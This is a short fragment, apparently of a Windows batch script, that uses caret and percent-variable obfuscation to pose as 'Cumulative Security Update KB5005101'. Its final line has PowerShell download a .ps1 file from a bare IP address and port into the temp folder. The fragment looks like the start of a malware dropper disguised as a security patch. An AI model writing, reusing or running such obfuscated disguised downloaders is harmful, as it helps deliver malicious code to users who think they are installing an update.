...
,Col%ls%or 0E && (,(@tIt%&1%lE ^Cumu%_UUID_%l^ati%#1%v^e Sec%#1%u^ri%_i_%ty Up^dat%'%e KB%Buffer_%KB5005101 && @Pow%#1%E^rsH^el%Socket():%l Ge^t-Hot%vibes%Fi^x),)
...
@powershell iwr -Uri "ht%i0%tp://192.168.1.72:8087/Update-KB50%i0_%05101.ps1" -OutFile "%tmp%\Update-KB50%i0_%05101.ps1"
